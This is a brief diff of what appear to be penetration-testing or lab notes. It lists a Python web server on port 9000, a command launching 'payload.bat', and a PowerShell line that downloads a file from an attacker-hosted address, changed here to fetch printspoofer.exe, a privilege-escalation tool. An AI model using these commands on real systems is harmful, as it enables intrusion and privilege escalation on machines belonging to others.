@@ -42,4 +42,4 @@ python3 -m http.server 9000
 
 - Start-Process "payload.bat"
 
-- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/Message.exe','Message.exe')"
+- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/printspoofer.exe','printspoofer.exe')"
